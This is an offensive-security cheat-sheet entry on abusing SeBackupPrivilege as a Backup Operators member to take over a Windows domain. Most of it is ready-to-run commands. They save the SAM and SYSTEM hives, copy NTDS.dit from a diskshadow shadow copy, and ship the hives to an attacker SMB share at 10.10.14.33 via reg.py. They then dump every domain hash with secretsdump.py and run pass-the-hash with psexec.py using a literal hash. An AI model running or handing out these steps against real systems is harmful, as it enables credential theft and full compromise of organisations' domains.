# 10.10 SeBackupPrivilege Abuse Backup Operators

> Abuse `SeBackupPrivilege` to read SAM/SYSTEM hives and VSS-shadow NTDS.dit via `diskshadow`, then `secretsdump.py` the lot.

## Overview

Membership in Backup Operators grants SeBackupPrivilege, which allows bypassing file ACLs to back up files. This enables dumping the SAM and SYSTEM registry hives and, by creating a VSS shadow copy with diskshadow, the NTDS.dit database. Use secretsdump.py to extract all domain credentials from the collected files.

## Steps

- Launch cmd.exe as Administrator (UAC required for SeBackupPrivilege to activate), verify with whoami /priv.
- Save SAM and SYSTEM hives with reg save.
- Create a diskshadow script to create a persistent shadow copy of C: exposed as P:.
- Use robocopy /b to copy NTDS.dit from the shadow copy.
- From Linux: start an SMB share with smbserver.py, then use reg.py to retrieve registry hives remotely.
- Combine SAM, SYSTEM, and NTDS.dit with secretsdump.py to extract all hashes.
- Use psexec.py with the Administrator hash for code execution.

## Commands

### Verify SeBackupPrivilege

```powershell
C:\Tools> whoami /priv
```

### Save SAM and SYSTEM hives (Windows)

```text
C:\Tools> reg save hklm\sam C:\users\Public\sam && reg save hklm\system C:\users\Public\system
```

### diskshadow script content

```text
set context persistent nowriters
```

### Execute diskshadow

```text
C:\Tools> diskshadow /s C:\Users\Public\diskshadowscript.txt
```

### Copy NTDS.dit with robocopy

```text
C:\Tools> robocopy /b P:\Windows\ntds\ C:\Users\Public\ ntds.dit
```

### Start SMB share from Linux

```bash
sudo smbserver.py -smb2support share .
```

### Retrieve registry hives via reg.py (Linux)

```bash
reg.py <DOMAIN>.local/pedro:[email protected] backup -o '\\10.10.14.33\share'
```

### Dump all credentials with secretsdump

```bash
secretsdump.py -sam SAM.save -system SYSTEM.save -ntds ntds.dit LOCAL
```

### PtH with psexec.py

```bash
psexec.py [email protected] -hashes :f9ddbbd0677777796c8593ef89fb639c
```
